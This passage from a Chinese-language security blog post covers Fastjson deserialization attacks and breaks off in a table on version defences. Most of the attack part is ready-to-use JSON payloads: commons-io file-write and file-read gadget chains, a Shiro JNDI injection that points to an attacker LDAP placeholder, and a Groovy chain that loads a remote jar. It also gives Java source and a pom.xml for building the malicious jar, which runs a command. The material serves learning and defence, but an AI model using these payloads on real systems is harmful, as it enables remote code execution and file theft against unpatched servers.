class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;qaxnbaaaaaaaaaaaaaaa&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;trigger&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;trigger2&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;trigger3&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-利用commons-io读文件"><a href="#3-利用commons-io读文件" class="headerlink" title="3.利用commons-io读文件"></a>3.利用commons-io读文件</h4><ul>
<li>需要用到dnslog</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;abc&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file:///D://&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">37</span><span class="punctuation">]</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;address&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.abc.BOM[0]&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;xxx&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://127.0.0.1:5667/&quot;</span></span><br><span class="line">              <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;zzz&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.xxx.BOM[0]&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-5-2-主动开启autoType支持"><a href="#3-5-2-主动开启autoType支持" class="headerlink" title="3.5.2.主动开启autoType支持"></a>3.5.2.主动开启autoType支持</h3><h4 id="1-ShiroJNDI远程对象调用"><a href="#1-ShiroJNDI远程对象调用" class="headerlink" title="1.ShiroJNDI远程对象调用"></a>1.ShiroJNDI远程对象调用</h4><ul>
<li>Shiro链</li>
</ul>
<p>​	当系统开启<strong>autotype支持</strong>的时候，我们可以通过绕过黑名单的方式来实现JNDI注入。</p>
<p>​	但是需要目标系统具有<strong>shiro依赖</strong>，且shiro-core版本小于等于1.6。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;resourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://攻击者IP/Exploit&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="3-6-1-2-76-1-2-80绕过"><a href="#3-6-1-2-76-1-2-80绕过" class="headerlink" title="3.6. 1.2.76 - 1.2.80绕过"></a>3.6. 1.2.76 - 1.2.80绕过</h2><h3 id="3-6-1-groovy链"><a href="#3-6-1-groovy链" class="headerlink" title="3.6.1. groovy链"></a>3.6.1. groovy链</h3><ul>
<li><p>该链主要是通过groovy的依赖实现加载远程jar包。(无需主动开启autoType即可利用)</p>
<p>需要发送两个请求。</p>
</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;unit&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;classpathList&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://127.0.0.1/attack-1.jar&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>远程jar包如何编写？</p>
<p>参考<a target="_blank" rel="noopener" href="https://github.com/Lonely-night/fastjsonVul/tree/7f9d2d8ea1c27ae1f9c06076849ae76c25b6aff7%E7%9A%84attack%E5%86%99%E6%B3%95">https://github.com/Lonely-night/fastjsonVul/tree/7f9d2d8ea1c27ae1f9c06076849ae76c25b6aff7的attack写法</a></p>
<ul>
<li>GrabAnnotationTransformation2.java</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> groovy.grape;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.ASTNode;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.CompilePhase;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.SourceUnit;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.transform.ASTTransformation;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.transform.GroovyASTTransformation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GroovyASTTransformation(phase= CompilePhase.CONVERSION)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GrabAnnotationTransformation2</span> <span class="keyword">implements</span> <span class="title class_">ASTTransformation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GrabAnnotationTransformation2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(ASTNode[] nodes, SourceUnit source)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>org.codehaus.groovy.transform.ASTTransformation</li>
</ul>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groovy.grape.GrabAnnotationTransformation2</span><br></pre></td></tr></table></figure>

<ul>
<li>pom.xml</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>attack<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-6-2-1-2-80的其他默认关闭autoType利用方式"><a href="#3-6-2-1-2-80的其他默认关闭autoType利用方式" class="headerlink" title="3.6.2. 1.2.80的其他默认关闭autoType利用方式"></a>3.6.2. 1.2.80的其他默认关闭autoType利用方式</h3><ol>
<li><p>利用aspectjtools、ognl、dom4j、xalan结合common-io进行文件读写。</p>
<p>当然这些利用方式更偏向与白盒，黑盒的化只能用扫描器跑了，毕竟在没有源码的情况下很难完整的判断系统是否具有对应依赖，甚至是对应版本。因此黑河只能是要扫描器进行扫描。具体利用方式我就不一一去分析了，可以参考下面这个项目进行学习，<a target="_blank" rel="noopener" href="https://github.com/safe6Sec/ShiroAndFastJson">ShiroAndFastjson</a></p>
</li>
</ol>
<h1 id="4-防御阶段"><a href="#4-防御阶段" class="headerlink" title="4. 防御阶段"></a>4. 防御阶段</h1><h2 id="4-1-防御方案演进"><a href="#4-1-防御方案演进" class="headerlink" title="4.1.防御方案演进"></a>4.1.防御方案演进</h2><ul>
<li>以下是 Fastjson 防御机制的版本演变总结，涵盖 <strong>默认配置变化（autoType开关、黑&#x2F;白名单）</strong> 和 <strong>关键安全特性（Safemode）</strong> 的演进：</li>
</ul>
<hr>
<h3 id="版本防御机制演变总览"><a href="#版本防御机制演变总览" class="headerlink" title="版本防御机制演变总览"></a><strong>版本防御机制演变总览</strong></h3><table>
<thead>
<tr>
<th>版本范围</th>
<th>默认 <code>autoType</code> 状态</th>
<th>防御机制</th>
<th>关键特性&#x2F;漏洞</th>
</tr>
</thead>
<tbody><tr>
<td><strong>≤1.2.24</strong></td>
<td>开启（无限制）</td>
<td><strong>无黑名单&#x2F;白名单</strong></td>
<td>完全无防护，可任意反序列化类（RCE 高发）</td>
</tr>
<tr>
<td><strong>1.2.25~1.2.47</strong></td>
<td>默认关闭</td>
<td><strong>黑名单拦截</strong>（<code>denyList</code>）</td>
<td>首次引入黑名单，但存在缓存绕过漏洞（如1.2.47）</td>
</tr>
<tr>
<td><strong>1.2.48~1.2.67</strong></td>
<td>默认关闭</td>
<td><strong>白名单优先 + 黑名单兜底</strong></td>
<td>修复缓存漏洞，强制白名单校验</td>
</tr>
<tr>
